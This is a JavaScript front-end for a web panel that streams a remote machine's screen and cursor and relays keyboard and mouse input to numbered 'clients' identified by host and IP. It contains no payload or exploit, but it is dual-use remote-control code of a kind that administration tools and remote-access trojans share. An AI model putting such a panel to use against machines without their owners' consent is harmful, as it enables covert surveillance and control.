// language: JavaScript, file: public/js/rdp.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);

const clientId = Number(params.get('id'));
const hostName = params.get('host') || `client ${clientId}`;
const hostIp   = params.get('ip') || '';

$('target').textContent = `${hostName} @ ${hostIp} (id ${clientId})`;

let cfg = { monitor: 0, width: 1280, height: 720, quality: 50, fps: 10, keyboard: false, mouse: false };
let monitors = [];
let running = false;
let restarting = false;
let lastMouseSent = 0;
let framesThisSec = 0;
let lastFpsTick = Date.now();
let firstFrameSeen = false;

let consecutiveFails = 0;
let backoffMs = 0;
let autoReconnects = 0;
const AUTO_RECONNECT_LIMIT = 5;
const AUTO_RECONNECT_TRIGGER = 30;

let cursorTimer = null;
let lastCursor = null;
let cursorMisses = 0;

const PRESETS = {
  low:    { height: 480, quality: 40, fps: 8  },
  med:    { height: 720, quality: 55, fps: 10 },
  high:   { height: 900, quality: 75, fps: 15 },
  native: null,
};

const stage = $('stage');

const cursorDot = document.createElement('div');
cursorDot.className = 'cursor-dot';
cursorDot.style.display = 'none';

const img = document.createElement('img');
img.draggable = false;

img.addEventListener('load', () => {
  if (img.naturalWidth === 0) return;
  $('dot').classList.add('on');
  if (!firstFrameSeen) { firstFrameSeen = true; removeSpinner(); }
  layoutCursor();
  framesThisSec++;
  const now = Date.now();
  if (now - lastFpsTick >= 1000) {
    const nowEl = $('fps-now');
    if (nowEl) nowEl.textContent = String(framesThisSec);
    framesThisSec = 0;
    lastFpsTick = now;
  }
  consecutiveFails = 0;
  backoffMs = 0;
});

img.addEventListener('error', () => {
  $('dot').classList.remove('on');
  consecutiveFails++;
  backoffMs = Math.min(2000, 100 * Math.pow(1.5, Math.min(consecutiveFails, 6)));
  if (consecutiveFails >= AUTO_RECONNECT_TRIGGER && autoReconnects < AUTO_RECONNECT_LIMIT) {
    autoReconnects++;
    consecutiveFails = 0;
    doAutoReconnect();
  }
});

function showSpinner(text) {
  removeSpinner();
  const l = document.createElement('div');
  l.className = 'loading';
  const ring = document.createElement('div');
  ring.className = 'ring';
  const span = document.createElement('span');
  span.textContent = text;
  l.appendChild(ring); l.appendChild(span);
  stage.appendChild(l);
}
function removeSpinner() { stage.querySelectorAll('.loading').forEach(e => e.remove()); }
function setSpinnerText(text) {
  const s = stage.querySelector('.loading span');
  if (s) s.textContent = text;
}

function layoutCursor() {
  if (!lastCursor || !lastCursor.visible) { cursorDot.style.display = 'none'; return; }
  const rect = img.getBoundingClientRect();
  const stageRect = stage.getBoundingClientRect();
  if (rect.width === 0 || rect.height === 0) { cursorDot.style.display = 'none'; return; }
  const x = (rect.left - stageRect.left) + lastCursor.x * rect.width;
  const y = (rect.top  - stageRect.top)  + lastCursor.y * rect.height;
  cursorDot.style.left = `${x}px`;
  cursorDot.style.top  = `${y}px`;
  cursorDot.style.display = 'block';
}

async function doAutoReconnect() {
  if (!running) return;
  running = false;
  stopCursorPolling();
  cursorDot.style.display = 'none';
  try { await fetch(`/api/clients/${clientId}/rdp/stop`, { method: 'POST' }); } catch {}
  await new Promise(r => setTimeout(r, 1500));
  try { await start(); } catch {}
}

async function loadMonitors() {
  try {
    const r = await fetch(`/api/clients/${clientId}/monitors`);
    if (!r.ok) return;
    monitors = await r.json();
    const sel = $('monitor');
    sel.innerHTML = '';
    if (monitors.length === 0) {
      const o = document.createElement('option');
      o.value = '0'; o.textContent = 'default';
      sel.appendChild(o);
      return;
    }
    monitors.forEach((m, i) => {
      const o = document.createElement('option');
      o.value = String(i);
      o.textContent = `#${i} ${m.width}×${m.height}`;
      sel.appendChild(o);
    });
    sel.value = String(cfg.monitor);
    applyPreset($('preset').value);
  } catch {}
}

function applyPreset(name) {
  const mon = monitors[cfg.monitor];
  if (!mon) return;
  if (name === 'native') {
    cfg.width = mon.width; cfg.height = mon.height;
    cfg.quality = 75; cfg.fps = 10;
    syncFpsUI(); return;
  }
  const p = PRESETS[name]; if (!p) return;
  const targetH = Math.min(p.height, mon.height);
  const aspect  = mon.width / mon.height;
  let targetW   = Math.round(targetH * aspect / 2) * 2;
  if (targetW > mon.width) targetW = mon.width;
  cfg.width = targetW; cfg.height = targetH;
  cfg.quality = p.quality; cfg.fps = p.fps;
  syncFpsUI();
}

function syncFpsUI() {
  const slider = $('fps-slider'), label = $('fps-val'), target = $('fps-target');
  if (slider) slider.value = String(cfg.fps);
  if (label)  label.textContent = String(cfg.fps);
  if (target) target.textContent = String(cfg.fps);
}

async function start() {
  showSpinner('connecting…');
  firstFrameSeen = false;
  consecutiveFails = 0;
  lastCursor = null;
  cursorMisses = 0;
  cursorDot.style.display = 'none';

  if (img.parentNode) img.parentNode.removeChild(img);
  if (cursorDot.parentNode) cursorDot.parentNode.removeChild(cursorDot);

  const r = await fetch(`/api/clients/${clientId}/rdp/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(cfg),
  });
  if (!r.ok) { setSpinnerText('rdp start failed'); return; }

  running = true;
  stage.appendChild(img);
  stage.appendChild(cursorDot);
  startCursorPolling();
  loop();

  setTimeout(() => {
    if (!firstFrameSeen && running) setSpinnerText('no frames yet — check the client');
  }, 8000);
}

async function stop() {
  if (!running) return;
  running = false;
  stopCursorPolling();
  cursorDot.style.display = 'none';
  try { await fetch(`/api/clients/${clientId}/rdp/stop`, { method: 'POST' }); } catch {}
}

async function restart() {
  if (restarting) return;
  restarting = true;
  const btn = $('reset'); const orig = btn.textContent;
  btn.textContent = 'resetting…'; btn.disabled = true;
  try { await fetch(`/api/clients/${clientId}/rdp/stop`, { method: 'POST' }); } catch {}
  running = false; stopCursorPolling(); cursorDot.style.display = 'none';
  await new Promise(r => setTimeout(r, 3500));
  const r = await fetch(`/api/clients/${clientId}/rdp/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(cfg),
  });
  if (r.ok) {
    running = true; firstFrameSeen = false; lastCursor = null; cursorMisses = 0;
    if (img.parentNode) img.parentNode.removeChild(img);
    if (cursorDot.parentNode) cursorDot.parentNode.removeChild(cursorDot);
    stage.appendChild(img); stage.appendChild(cursorDot);
    showSpinner('connecting…'); startCursorPolling(); loop();
  }
  btn.textContent = orig; btn.disabled = false; restarting = false;
}

async function loop() {
  while (running) {
    const t0 = performance.now();
    const ok = await new Promise((resolve) => {
      const tmp = new Image();
      tmp.onload = () => {
        if (tmp.naturalWidth === 0) { resolve(false); return; }
        img.src = tmp.src; resolve(true);
      };
      tmp.onerror = () => resolve(false);
      tmp.src = `/api/clients/${clientId}/screen?t=${Date.now()}`;
    });
    if (!running) break;
    if (!ok) {
      consecutiveFails++;
      backoffMs = Math.min(2000, 100 * Math.pow(1.5, Math.min(consecutiveFails, 6)));
      await new Promise(r => setTimeout(r, backoffMs));
      if (consecutiveFails >= AUTO_RECONNECT_TRIGGER && autoReconnects < AUTO_RECONNECT_LIMIT) {
        autoReconnects++; consecutiveFails = 0; doAutoReconnect(); break;
      }
      continue;
    } else { consecutiveFails = 0; backoffMs = 0; }
    const elapsed = performance.now() - t0;
    const target = 1000 / Math.max(cfg.fps, 1);
    if (elapsed < target) await new Promise(r => setTimeout(r, target - elapsed));
  }
}

function startCursorPolling() {
  stopCursorPolling();
  cursorTimer = setInterval(pollCursor, 80);
}
function stopCursorPolling() {
  if (cursorTimer) { clearInterval(cursorTimer); cursorTimer = null; }
}

async function pollCursor() {
  if (!running) return;
  try {
    const r = await fetch(`/api/clients/${clientId}/cursor?t=${Date.now()}`, {
      credentials: 'same-origin',
      cache: 'no-store',
      headers: { 'Cache-Control': 'no-cache', 'Pragma': 'no-cache' },
    });
    if (r.status === 204) {
      cursorMisses++;
      lastCursor = null;
      cursorDot.style.display = 'none';
      return;
    }
    if (!r.ok) return;
    cursorMisses = 0;
    const c = await r.json();
    lastCursor = { x: c.x, y: c.y, visible: c.visible };
    layoutCursor();
  } catch {}
}

window.addEventListener('resize', layoutCursor);

$('preset').addEventListener('change', async (e) => {
  applyPreset(e.target.value);
  if (running) await pushCfg({ fps: cfg.fps, quality: cfg.quality });
});
$('monitor').addEventListener('change', async (e) => {
  cfg.monitor = Number(e.target.value) || 0;
  applyPreset($('preset').value);
  if (running) { await stop(); await new Promise(r => setTimeout(r, 250)); await start(); }
});
{
  const slider = $('fps-slider'), label = $('fps-val'), target = $('fps-target');
  if (slider) {
    slider.addEventListener('input', () => {
      cfg.fps = Math.max(1, Math.min(60, Number(slider.value) || 10));
      if (label)  label.textContent = String(cfg.fps);
      if (target) target.textContent = String(cfg.fps);
    });
    slider.addEventListener('change', () => { if (running) pushCfg({ fps: cfg.fps }); });
  }
}
async function pushCfg(extra) {
  try {
    await fetch(`/api/clients/${clientId}/rdp/update`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keyboard: cfg.keyboard, mouse: cfg.mouse, ...(extra || {}) }),
    });
  } catch {}
}
$('kb').addEventListener('click', () => {
  cfg.keyboard = !cfg.keyboard;
  $('kb').classList.toggle('active', cfg.keyboard);
  pushCfg();
});
$('mouse').addEventListener('click', () => {
  cfg.mouse = !cfg.mouse;
  $('mouse').classList.toggle('active', cfg.mouse);
  pushCfg();
});
$('reset').addEventListener('click', restart);

function sendInput(payload) {
  fetch(`/api/clients/${clientId}/input`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload), keepalive: true,
  }).catch(() => {});
}
function norm(e) {
  const r = img.getBoundingClientRect();
  const x = (e.clientX - r.left) / r.width;
  const y = (e.clientY - r.top)  / r.height;
  return { x: Math.max(0, Math.min(1, x)), y: Math.max(0, Math.min(1, y)) };
}
img.addEventListener('mousemove', (e) => {
  if (!cfg.mouse) return;
  const now = performance.now();
  if (now - lastMouseSent < 25) return;
  lastMouseSent = now;
  const p = norm(e);
  sendInput({ type: 'mouse_move', x: p.x, y: p.y });
});
img.addEventListener('mousedown', (e) => { if (!cfg.mouse) return; e.preventDefault(); sendInput({ type: 'mouse_down', button: btnName(e.button) }); });
img.addEventListener('mouseup',   (e) => { if (!cfg.mouse) return; e.preventDefault(); sendInput({ type: 'mouse_up',   button: btnName(e.button) }); });
img.addEventListener('contextmenu', (e) => e.preventDefault());
img.addEventListener('wheel', (e) => { if (!cfg.mouse) return; e.preventDefault(); sendInput({ type: 'mouse_wheel', dy: Math.sign(e.deltaY) }); }, { passive: false });

document.addEventListener('keydown', (e) => {
  if (!cfg.keyboard) return;
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
  if (e.key === 'Escape' && e.ctrlKey && e.shiftKey) { e.preventDefault(); return; }
  if (e.key === 'Delete' && e.ctrlKey && e.altKey)   { e.preventDefault(); return; }
  if (e.key === 'Meta' || e.key === 'OS')             { e.preventDefault(); return; }
  e.preventDefault();
  sendInput({ type: 'key', code: e.code, key: e.key, down: true });
});
document.addEventListener('keyup', (e) => {
  if (!cfg.keyboard) return;
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
  if (e.key === 'Escape' && e.ctrlKey && e.shiftKey) { e.preventDefault(); return; }
  if (e.key === 'Delete' && e.ctrlKey && e.altKey)   { e.preventDefault(); return; }
  if (e.key === 'Meta' || e.key === 'OS')             { e.preventDefault(); return; }
  e.preventDefault();
  sendInput({ type: 'key', code: e.code, key: e.key, down: false });
});

function btnName(b) { return b === 2 ? 'right' : b === 1 ? 'middle' : 'left'; }

$('stop').addEventListener('click', async () => { await stop(); window.close(); });
function beaconStop() {
  const body = new Blob(['{}'], { type: 'application/json' });
  try { navigator.sendBeacon(`/api/clients/${clientId}/rdp/stop`, body); } catch {}
  stop();
}
window.addEventListener('beforeunload', beaconStop);
window.addEventListener('pagehide', beaconStop);

loadMonitors().then(() => { syncFpsUI(); start(); });